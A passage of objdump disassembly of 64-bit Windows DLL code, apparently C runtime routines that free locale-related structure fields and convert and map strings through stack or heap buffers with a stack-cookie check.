   18000b90b:	48 3b 0d 5e e5 00 00 	cmp    0xe55e(%rip),%rcx        # 0x180019e70
   18000b912:	74 05                	je     0x18000b919
   18000b914:	e8 67 9c ff ff       	call   0x180005580
   18000b919:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   18000b91d:	48 3b 0d 54 e5 00 00 	cmp    0xe554(%rip),%rcx        # 0x180019e78
   18000b924:	74 05                	je     0x18000b92b
   18000b926:	e8 55 9c ff ff       	call   0x180005580
   18000b92b:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   18000b92f:	48 3b 0d 62 e5 00 00 	cmp    0xe562(%rip),%rcx        # 0x180019e98
   18000b936:	74 05                	je     0x18000b93d
   18000b938:	e8 43 9c ff ff       	call   0x180005580
   18000b93d:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   18000b941:	48 3b 0d 58 e5 00 00 	cmp    0xe558(%rip),%rcx        # 0x180019ea0
   18000b948:	74 05                	je     0x18000b94f
   18000b94a:	e8 31 9c ff ff       	call   0x180005580
   18000b94f:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   18000b953:	48 3b 0d 4e e5 00 00 	cmp    0xe54e(%rip),%rcx        # 0x180019ea8
   18000b95a:	74 05                	je     0x18000b961
   18000b95c:	e8 1f 9c ff ff       	call   0x180005580
   18000b961:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   18000b968:	48 3b 0d 41 e5 00 00 	cmp    0xe541(%rip),%rcx        # 0x180019eb0
   18000b96f:	74 05                	je     0x18000b976
   18000b971:	e8 0a 9c ff ff       	call   0x180005580
   18000b976:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   18000b97d:	48 3b 0d 34 e5 00 00 	cmp    0xe534(%rip),%rcx        # 0x180019eb8
   18000b984:	74 05                	je     0x18000b98b
   18000b986:	e8 f5 9b ff ff       	call   0x180005580
   18000b98b:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   18000b992:	48 3b 0d 27 e5 00 00 	cmp    0xe527(%rip),%rcx        # 0x180019ec0
   18000b999:	74 05                	je     0x18000b9a0
   18000b99b:	e8 e0 9b ff ff       	call   0x180005580
   18000b9a0:	48 83 c4 20          	add    $0x20,%rsp
   18000b9a4:	5b                   	pop    %rbx
   18000b9a5:	c3                   	ret
   18000b9a6:	cc                   	int3
   18000b9a7:	cc                   	int3
   18000b9a8:	48 85 c9             	test   %rcx,%rcx
   18000b9ab:	74 66                	je     0x18000ba13
   18000b9ad:	53                   	push   %rbx
   18000b9ae:	48 83 ec 20          	sub    $0x20,%rsp
   18000b9b2:	48 8b d9             	mov    %rcx,%rbx
   18000b9b5:	48 8b 09             	mov    (%rcx),%rcx
   18000b9b8:	48 3b 0d 71 e4 00 00 	cmp    0xe471(%rip),%rcx        # 0x180019e30
   18000b9bf:	74 05                	je     0x18000b9c6
   18000b9c1:	e8 ba 9b ff ff       	call   0x180005580
   18000b9c6:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000b9ca:	48 3b 0d 67 e4 00 00 	cmp    0xe467(%rip),%rcx        # 0x180019e38
   18000b9d1:	74 05                	je     0x18000b9d8
   18000b9d3:	e8 a8 9b ff ff       	call   0x180005580
   18000b9d8:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000b9dc:	48 3b 0d 5d e4 00 00 	cmp    0xe45d(%rip),%rcx        # 0x180019e40
   18000b9e3:	74 05                	je     0x18000b9ea
   18000b9e5:	e8 96 9b ff ff       	call   0x180005580
   18000b9ea:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   18000b9ee:	48 3b 0d 93 e4 00 00 	cmp    0xe493(%rip),%rcx        # 0x180019e88
   18000b9f5:	74 05                	je     0x18000b9fc
   18000b9f7:	e8 84 9b ff ff       	call   0x180005580
   18000b9fc:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   18000ba00:	48 3b 0d 89 e4 00 00 	cmp    0xe489(%rip),%rcx        # 0x180019e90
   18000ba07:	74 05                	je     0x18000ba0e
   18000ba09:	e8 72 9b ff ff       	call   0x180005580
   18000ba0e:	48 83 c4 20          	add    $0x20,%rsp
   18000ba12:	5b                   	pop    %rbx
   18000ba13:	c3                   	ret
   18000ba14:	48 85 c9             	test   %rcx,%rcx
   18000ba17:	0f 84 f0 03 00 00    	je     0x18000be0d
   18000ba1d:	53                   	push   %rbx
   18000ba1e:	48 83 ec 20          	sub    $0x20,%rsp
   18000ba22:	48 8b d9             	mov    %rcx,%rbx
   18000ba25:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   18000ba29:	e8 52 9b ff ff       	call   0x180005580
   18000ba2e:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   18000ba32:	e8 49 9b ff ff       	call   0x180005580
   18000ba37:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   18000ba3b:	e8 40 9b ff ff       	call   0x180005580
   18000ba40:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   18000ba44:	e8 37 9b ff ff       	call   0x180005580
   18000ba49:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000ba4d:	e8 2e 9b ff ff       	call   0x180005580
   18000ba52:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   18000ba56:	e8 25 9b ff ff       	call   0x180005580
   18000ba5b:	48 8b 0b             	mov    (%rbx),%rcx
   18000ba5e:	e8 1d 9b ff ff       	call   0x180005580
   18000ba63:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   18000ba67:	e8 14 9b ff ff       	call   0x180005580
   18000ba6c:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   18000ba70:	e8 0b 9b ff ff       	call   0x180005580
   18000ba75:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   18000ba79:	e8 02 9b ff ff       	call   0x180005580
   18000ba7e:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   18000ba82:	e8 f9 9a ff ff       	call   0x180005580
   18000ba87:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   18000ba8b:	e8 f0 9a ff ff       	call   0x180005580
   18000ba90:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   18000ba94:	e8 e7 9a ff ff       	call   0x180005580
   18000ba99:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   18000ba9d:	e8 de 9a ff ff       	call   0x180005580
   18000baa2:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   18000baa6:	e8 d5 9a ff ff       	call   0x180005580
   18000baab:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   18000baaf:	e8 cc 9a ff ff       	call   0x180005580
   18000bab4:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   18000babb:	e8 c0 9a ff ff       	call   0x180005580
   18000bac0:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   18000bac7:	e8 b4 9a ff ff       	call   0x180005580
   18000bacc:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   18000bad3:	e8 a8 9a ff ff       	call   0x180005580
   18000bad8:	48 8b 8b 98 00 00 00 	mov    0x98(%rbx),%rcx
   18000badf:	e8 9c 9a ff ff       	call   0x180005580
   18000bae4:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   18000baeb:	e8 90 9a ff ff       	call   0x180005580
   18000baf0:	48 8b 8b a8 00 00 00 	mov    0xa8(%rbx),%rcx
   18000baf7:	e8 84 9a ff ff       	call   0x180005580
   18000bafc:	48 8b 8b b0 00 00 00 	mov    0xb0(%rbx),%rcx
   18000bb03:	e8 78 9a ff ff       	call   0x180005580
   18000bb08:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   18000bb0f:	e8 6c 9a ff ff       	call   0x180005580
   18000bb14:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   18000bb1b:	e8 60 9a ff ff       	call   0x180005580
   18000bb20:	48 8b 8b c8 00 00 00 	mov    0xc8(%rbx),%rcx
   18000bb27:	e8 54 9a ff ff       	call   0x180005580
   18000bb2c:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   18000bb33:	e8 48 9a ff ff       	call   0x180005580
   18000bb38:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   18000bb3f:	e8 3c 9a ff ff       	call   0x180005580
   18000bb44:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   18000bb4b:	e8 30 9a ff ff       	call   0x180005580
   18000bb50:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   18000bb57:	e8 24 9a ff ff       	call   0x180005580
   18000bb5c:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   18000bb63:	e8 18 9a ff ff       	call   0x180005580
   18000bb68:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000bb6f:	e8 0c 9a ff ff       	call   0x180005580
   18000bb74:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   18000bb7b:	e8 00 9a ff ff       	call   0x180005580
   18000bb80:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   18000bb87:	e8 f4 99 ff ff       	call   0x180005580
   18000bb8c:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   18000bb93:	e8 e8 99 ff ff       	call   0x180005580
   18000bb98:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   18000bb9f:	e8 dc 99 ff ff       	call   0x180005580
   18000bba4:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   18000bbab:	e8 d0 99 ff ff       	call   0x180005580
   18000bbb0:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   18000bbb7:	e8 c4 99 ff ff       	call   0x180005580
   18000bbbc:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   18000bbc3:	e8 b8 99 ff ff       	call   0x180005580
   18000bbc8:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   18000bbcf:	e8 ac 99 ff ff       	call   0x180005580
   18000bbd4:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   18000bbdb:	e8 a0 99 ff ff       	call   0x180005580
   18000bbe0:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   18000bbe7:	e8 94 99 ff ff       	call   0x180005580
   18000bbec:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   18000bbf3:	e8 88 99 ff ff       	call   0x180005580
   18000bbf8:	48 8b 8b 68 01 00 00 	mov    0x168(%rbx),%rcx
   18000bbff:	e8 7c 99 ff ff       	call   0x180005580
   18000bc04:	48 8b 8b 70 01 00 00 	mov    0x170(%rbx),%rcx
   18000bc0b:	e8 70 99 ff ff       	call   0x180005580
   18000bc10:	48 8b 8b 78 01 00 00 	mov    0x178(%rbx),%rcx
   18000bc17:	e8 64 99 ff ff       	call   0x180005580
   18000bc1c:	48 8b 8b 80 01 00 00 	mov    0x180(%rbx),%rcx
   18000bc23:	e8 58 99 ff ff       	call   0x180005580
   18000bc28:	48 8b 8b 88 01 00 00 	mov    0x188(%rbx),%rcx
   18000bc2f:	e8 4c 99 ff ff       	call   0x180005580
   18000bc34:	48 8b 8b 90 01 00 00 	mov    0x190(%rbx),%rcx
   18000bc3b:	e8 40 99 ff ff       	call   0x180005580
   18000bc40:	48 8b 8b 60 01 00 00 	mov    0x160(%rbx),%rcx
   18000bc47:	e8 34 99 ff ff       	call   0x180005580
   18000bc4c:	48 8b 8b a0 01 00 00 	mov    0x1a0(%rbx),%rcx
   18000bc53:	e8 28 99 ff ff       	call   0x180005580
   18000bc58:	48 8b 8b a8 01 00 00 	mov    0x1a8(%rbx),%rcx
   18000bc5f:	e8 1c 99 ff ff       	call   0x180005580
   18000bc64:	48 8b 8b b0 01 00 00 	mov    0x1b0(%rbx),%rcx
   18000bc6b:	e8 10 99 ff ff       	call   0x180005580
   18000bc70:	48 8b 8b b8 01 00 00 	mov    0x1b8(%rbx),%rcx
   18000bc77:	e8 04 99 ff ff       	call   0x180005580
   18000bc7c:	48 8b 8b c0 01 00 00 	mov    0x1c0(%rbx),%rcx
   18000bc83:	e8 f8 98 ff ff       	call   0x180005580
   18000bc88:	48 8b 8b c8 01 00 00 	mov    0x1c8(%rbx),%rcx
   18000bc8f:	e8 ec 98 ff ff       	call   0x180005580
   18000bc94:	48 8b 8b 98 01 00 00 	mov    0x198(%rbx),%rcx
   18000bc9b:	e8 e0 98 ff ff       	call   0x180005580
   18000bca0:	48 8b 8b d0 01 00 00 	mov    0x1d0(%rbx),%rcx
   18000bca7:	e8 d4 98 ff ff       	call   0x180005580
   18000bcac:	48 8b 8b d8 01 00 00 	mov    0x1d8(%rbx),%rcx
   18000bcb3:	e8 c8 98 ff ff       	call   0x180005580
   18000bcb8:	48 8b 8b e0 01 00 00 	mov    0x1e0(%rbx),%rcx
   18000bcbf:	e8 bc 98 ff ff       	call   0x180005580
   18000bcc4:	48 8b 8b e8 01 00 00 	mov    0x1e8(%rbx),%rcx
   18000bccb:	e8 b0 98 ff ff       	call   0x180005580
   18000bcd0:	48 8b 8b f0 01 00 00 	mov    0x1f0(%rbx),%rcx
   18000bcd7:	e8 a4 98 ff ff       	call   0x180005580
   18000bcdc:	48 8b 8b f8 01 00 00 	mov    0x1f8(%rbx),%rcx
   18000bce3:	e8 98 98 ff ff       	call   0x180005580
   18000bce8:	48 8b 8b 00 02 00 00 	mov    0x200(%rbx),%rcx
   18000bcef:	e8 8c 98 ff ff       	call   0x180005580
   18000bcf4:	48 8b 8b 08 02 00 00 	mov    0x208(%rbx),%rcx
   18000bcfb:	e8 80 98 ff ff       	call   0x180005580
   18000bd00:	48 8b 8b 10 02 00 00 	mov    0x210(%rbx),%rcx
   18000bd07:	e8 74 98 ff ff       	call   0x180005580
   18000bd0c:	48 8b 8b 18 02 00 00 	mov    0x218(%rbx),%rcx
   18000bd13:	e8 68 98 ff ff       	call   0x180005580
   18000bd18:	48 8b 8b 20 02 00 00 	mov    0x220(%rbx),%rcx
   18000bd1f:	e8 5c 98 ff ff       	call   0x180005580
   18000bd24:	48 8b 8b 28 02 00 00 	mov    0x228(%rbx),%rcx
   18000bd2b:	e8 50 98 ff ff       	call   0x180005580
   18000bd30:	48 8b 8b 30 02 00 00 	mov    0x230(%rbx),%rcx
   18000bd37:	e8 44 98 ff ff       	call   0x180005580
   18000bd3c:	48 8b 8b 38 02 00 00 	mov    0x238(%rbx),%rcx
   18000bd43:	e8 38 98 ff ff       	call   0x180005580
   18000bd48:	48 8b 8b 40 02 00 00 	mov    0x240(%rbx),%rcx
   18000bd4f:	e8 2c 98 ff ff       	call   0x180005580
   18000bd54:	48 8b 8b 48 02 00 00 	mov    0x248(%rbx),%rcx
   18000bd5b:	e8 20 98 ff ff       	call   0x180005580
   18000bd60:	48 8b 8b 50 02 00 00 	mov    0x250(%rbx),%rcx
   18000bd67:	e8 14 98 ff ff       	call   0x180005580
   18000bd6c:	48 8b 8b 58 02 00 00 	mov    0x258(%rbx),%rcx
   18000bd73:	e8 08 98 ff ff       	call   0x180005580
   18000bd78:	48 8b 8b 60 02 00 00 	mov    0x260(%rbx),%rcx
   18000bd7f:	e8 fc 97 ff ff       	call   0x180005580
   18000bd84:	48 8b 8b 68 02 00 00 	mov    0x268(%rbx),%rcx
   18000bd8b:	e8 f0 97 ff ff       	call   0x180005580
   18000bd90:	48 8b 8b 70 02 00 00 	mov    0x270(%rbx),%rcx
   18000bd97:	e8 e4 97 ff ff       	call   0x180005580
   18000bd9c:	48 8b 8b 78 02 00 00 	mov    0x278(%rbx),%rcx
   18000bda3:	e8 d8 97 ff ff       	call   0x180005580
   18000bda8:	48 8b 8b 80 02 00 00 	mov    0x280(%rbx),%rcx
   18000bdaf:	e8 cc 97 ff ff       	call   0x180005580
   18000bdb4:	48 8b 8b 88 02 00 00 	mov    0x288(%rbx),%rcx
   18000bdbb:	e8 c0 97 ff ff       	call   0x180005580
   18000bdc0:	48 8b 8b 90 02 00 00 	mov    0x290(%rbx),%rcx
   18000bdc7:	e8 b4 97 ff ff       	call   0x180005580
   18000bdcc:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
   18000bdd3:	e8 a8 97 ff ff       	call   0x180005580
   18000bdd8:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   18000bddf:	e8 9c 97 ff ff       	call   0x180005580
   18000bde4:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   18000bdeb:	e8 90 97 ff ff       	call   0x180005580
   18000bdf0:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   18000bdf7:	e8 84 97 ff ff       	call   0x180005580
   18000bdfc:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   18000be03:	e8 78 97 ff ff       	call   0x180005580
   18000be08:	48 83 c4 20          	add    $0x20,%rsp
   18000be0c:	5b                   	pop    %rbx
   18000be0d:	c3                   	ret
   18000be0e:	cc                   	int3
   18000be0f:	cc                   	int3
   18000be10:	40 55                	rex push %rbp
   18000be12:	41 54                	push   %r12
   18000be14:	41 55                	push   %r13
   18000be16:	41 56                	push   %r14
   18000be18:	41 57                	push   %r15
   18000be1a:	48 83 ec 50          	sub    $0x50,%rsp
   18000be1e:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   18000be23:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   18000be27:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   18000be2b:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   18000be2f:	48 8b 05 ca d1 00 00 	mov    0xd1ca(%rip),%rax        # 0x180019000
   18000be36:	48 33 c5             	xor    %rbp,%rax
   18000be39:	48 89 45 08          	mov    %rax,0x8(%rbp)
   18000be3d:	8b 5d 60             	mov    0x60(%rbp),%ebx
   18000be40:	33 ff                	xor    %edi,%edi
   18000be42:	4d 8b e1             	mov    %r9,%r12
   18000be45:	45 8b e8             	mov    %r8d,%r13d
   18000be48:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   18000be4c:	85 db                	test   %ebx,%ebx
   18000be4e:	7e 2a                	jle    0x18000be7a
   18000be50:	44 8b d3             	mov    %ebx,%r10d
   18000be53:	49 8b c1             	mov    %r9,%rax
   18000be56:	41 ff ca             	dec    %r10d
   18000be59:	40 38 38             	cmp    %dil,(%rax)
   18000be5c:	74 0c                	je     0x18000be6a
   18000be5e:	48 ff c0             	inc    %rax
   18000be61:	45 85 d2             	test   %r10d,%r10d
   18000be64:	75 f0                	jne    0x18000be56
   18000be66:	41 83 ca ff          	or     $0xffffffff,%r10d
   18000be6a:	8b c3                	mov    %ebx,%eax
   18000be6c:	41 2b c2             	sub    %r10d,%eax
   18000be6f:	ff c8                	dec    %eax
   18000be71:	3b c3                	cmp    %ebx,%eax
   18000be73:	8d 58 01             	lea    0x1(%rax),%ebx
   18000be76:	7c 02                	jl     0x18000be7a
   18000be78:	8b d8                	mov    %eax,%ebx
   18000be7a:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   18000be7e:	8b f7                	mov    %edi,%esi
   18000be80:	45 85 f6             	test   %r14d,%r14d
   18000be83:	75 07                	jne    0x18000be8c
   18000be85:	48 8b 01             	mov    (%rcx),%rax
   18000be88:	44 8b 70 04          	mov    0x4(%rax),%r14d
   18000be8c:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   18000be92:	44 8b cb             	mov    %ebx,%r9d
   18000be95:	4d 8b c4             	mov    %r12,%r8
   18000be98:	1b d2                	sbb    %edx,%edx
   18000be9a:	41 8b ce             	mov    %r14d,%ecx
   18000be9d:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   18000bea1:	83 e2 08             	and    $0x8,%edx
   18000bea4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000bea9:	ff c2                	inc    %edx
   18000beab:	ff 15 27 52 00 00    	call   *0x5227(%rip)        # 0x1800110d8
   18000beb1:	4c 63 f8             	movslq %eax,%r15
   18000beb4:	85 c0                	test   %eax,%eax
   18000beb6:	75 07                	jne    0x18000bebf
   18000beb8:	33 c0                	xor    %eax,%eax
   18000beba:	e9 17 02 00 00       	jmp    0x18000c0d6
   18000bebf:	49 b9 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r9
   18000bec6:	ff ff 0f 
   18000bec9:	85 c0                	test   %eax,%eax
   18000becb:	7e 6e                	jle    0x18000bf3b
   18000becd:	33 d2                	xor    %edx,%edx
   18000becf:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   18000bed3:	49 f7 f7             	div    %r15
   18000bed6:	48 83 f8 02          	cmp    $0x2,%rax
   18000beda:	72 5f                	jb     0x18000bf3b
   18000bedc:	4b 8d 0c 3f          	lea    (%r15,%r15,1),%rcx
   18000bee0:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000bee4:	48 3b c1             	cmp    %rcx,%rax
   18000bee7:	76 52                	jbe    0x18000bf3b
   18000bee9:	4a 8d 0c 7d 10 00 00 	lea    0x10(,%r15,2),%rcx
   18000bef0:	00 
   18000bef1:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   18000bef8:	77 2a                	ja     0x18000bf24
   18000befa:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000befe:	48 3b c1             	cmp    %rcx,%rax
   18000bf01:	77 03                	ja     0x18000bf06
   18000bf03:	49 8b c1             	mov    %r9,%rax
   18000bf06:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000bf0a:	e8 81 97 ff ff       	call   0x180005690
   18000bf0f:	48 2b e0             	sub    %rax,%rsp
   18000bf12:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   18000bf17:	48 85 ff             	test   %rdi,%rdi
   18000bf1a:	74 9c                	je     0x18000beb8
   18000bf1c:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   18000bf22:	eb 13                	jmp    0x18000bf37
   18000bf24:	e8 97 96 ff ff       	call   0x1800055c0
   18000bf29:	48 8b f8             	mov    %rax,%rdi
   18000bf2c:	48 85 c0             	test   %rax,%rax
   18000bf2f:	74 0a                	je     0x18000bf3b
   18000bf31:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000bf37:	48 83 c7 10          	add    $0x10,%rdi
   18000bf3b:	48 85 ff             	test   %rdi,%rdi
   18000bf3e:	0f 84 74 ff ff ff    	je     0x18000beb8
   18000bf44:	44 8b cb             	mov    %ebx,%r9d
   18000bf47:	4d 8b c4             	mov    %r12,%r8
   18000bf4a:	ba 01 00 00 00       	mov    $0x1,%edx
   18000bf4f:	41 8b ce             	mov    %r14d,%ecx
   18000bf52:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   18000bf57:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000bf5c:	ff 15 76 51 00 00    	call   *0x5176(%rip)        # 0x1800110d8
   18000bf62:	85 c0                	test   %eax,%eax
   18000bf64:	0f 84 59 01 00 00    	je     0x18000c0c3
   18000bf6a:	4c 8b 65 00          	mov    0x0(%rbp),%r12
   18000bf6e:	21 74 24 28          	and    %esi,0x28(%rsp)
   18000bf72:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   18000bf77:	49 8b cc             	mov    %r12,%rcx
   18000bf7a:	45 8b cf             	mov    %r15d,%r9d
   18000bf7d:	4c 8b c7             	mov    %rdi,%r8
   18000bf80:	41 8b d5             	mov    %r13d,%edx
   18000bf83:	e8 30 06 00 00       	call   0x18000c5b8
   18000bf88:	48 63 f0             	movslq %eax,%rsi
   18000bf8b:	85 c0                	test   %eax,%eax
   18000bf8d:	0f 84 30 01 00 00    	je     0x18000c0c3
   18000bf93:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   18000bf99:	45 85 e9             	test   %r13d,%r9d
   18000bf9c:	74 36                	je     0x18000bfd4
   18000bf9e:	8b 4d 70             	mov    0x70(%rbp),%ecx
   18000bfa1:	85 c9                	test   %ecx,%ecx
   18000bfa3:	0f 84 1a 01 00 00    	je     0x18000c0c3
   18000bfa9:	3b f1                	cmp    %ecx,%esi
   18000bfab:	0f 8f 12 01 00 00    	jg     0x18000c0c3
   18000bfb1:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000bfb5:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   18000bfb9:	45 8b cf             	mov    %r15d,%r9d
   18000bfbc:	4c 8b c7             	mov    %rdi,%r8
   18000bfbf:	41 8b d5             	mov    %r13d,%edx
   18000bfc2:	49 8b cc             	mov    %r12,%rcx
   18000bfc5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000bfca:	e8 e9 05 00 00       	call   0x18000c5b8
   18000bfcf:	e9 ef 00 00 00       	jmp    0x18000c0c3
   18000bfd4:	85 c0                	test   %eax,%eax
   18000bfd6:	7e 77                	jle    0x18000c04f
   18000bfd8:	33 d2                	xor    %edx,%edx
   18000bfda:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   18000bfde:	48 f7 f6             	div    %rsi
   18000bfe1:	48 83 f8 02          	cmp    $0x2,%rax
   18000bfe5:	72 68                	jb     0x18000c04f
   18000bfe7:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   18000bfeb:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000bfef:	48 3b c1             	cmp    %rcx,%rax
   18000bff2:	76 5b                	jbe    0x18000c04f
   18000bff4:	48 8d 0c 75 10 00 00 	lea    0x10(,%rsi,2),%rcx
   18000bffb:	00 
   18000bffc:	49 3b c9             	cmp    %r9,%rcx
   18000bfff:	77 35                	ja     0x18000c036
   18000c001:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000c005:	48 3b c1             	cmp    %rcx,%rax
   18000c008:	77 0a                	ja     0x18000c014
   18000c00a:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000c011:	ff ff 0f 
   18000c014:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000c018:	e8 73 96 ff ff       	call   0x180005690
   18000c01d:	48 2b e0             	sub    %rax,%rsp
   18000c020:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   18000c025:	48 85 db             	test   %rbx,%rbx
   18000c028:	0f 84 95 00 00 00    	je     0x18000c0c3
   18000c02e:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000c034:	eb 13                	jmp    0x18000c049
   18000c036:	e8 85 95 ff ff       	call   0x1800055c0
   18000c03b:	48 8b d8             	mov    %rax,%rbx
   18000c03e:	48 85 c0             	test   %rax,%rax
   18000c041:	74 0e                	je     0x18000c051
   18000c043:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000c049:	48 83 c3 10          	add    $0x10,%rbx
   18000c04d:	eb 02                	jmp    0x18000c051
   18000c04f:	33 db                	xor    %ebx,%ebx
   18000c051:	48 85 db             	test   %rbx,%rbx
   18000c054:	74 6d                	je     0x18000c0c3
   18000c056:	45 8b cf             	mov    %r15d,%r9d
   18000c059:	4c 8b c7             	mov    %rdi,%r8
   18000c05c:	41 8b d5             	mov    %r13d,%edx
   18000c05f:	49 8b cc             	mov    %r12,%rcx
   18000c062:	89 74 24 28          	mov    %esi,0x28(%rsp)
   18000c066:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000c06b:	e8 48 05 00 00       	call   0x18000c5b8
   18000c070:	33 c9                	xor    %ecx,%ecx
   18000c072:	85 c0                	test   %eax,%eax
   18000c074:	74 3c                	je     0x18000c0b2
   18000c076:	8b 45 70             	mov    0x70(%rbp),%eax
   18000c079:	33 d2                	xor    %edx,%edx
   18000c07b:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   18000c080:	44 8b ce             	mov    %esi,%r9d
   18000c083:	4c 8b c3             	mov    %rbx,%r8
   18000c086:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000c08b:	85 c0                	test   %eax,%eax
   18000c08d:	75 0b                	jne    0x18000c09a
   18000c08f:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   18000c093:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000c098:	eb 0d                	jmp    0x18000c0a7
   18000c09a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c09e:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000c0a2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c0a7:	41 8b ce             	mov    %r14d,%ecx
   18000c0aa:	ff 15 30 50 00 00    	call   *0x5030(%rip)        # 0x1800110e0
   18000c0b0:	8b f0                	mov    %eax,%esi
   18000c0b2:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000c0b6:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c0bc:	75 05                	jne    0x18000c0c3
   18000c0be:	e8 bd 94 ff ff       	call   0x180005580
   18000c0c3:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   18000c0c7:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c0cd:	75 05                	jne    0x18000c0d4
   18000c0cf:	e8 ac 94 ff ff       	call   0x180005580
   18000c0d4:	8b c6                	mov    %esi,%eax
   18000c0d6:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   18000c0da:	48 33 cd             	xor    %rbp,%rcx
   18000c0dd:	e8 4e 91 ff ff       	call   0x180005230
   18000c0e2:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   18000c0e6:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   18000c0ea:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   18000c0ee:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   18000c0f2:	41 5f                	pop    %r15
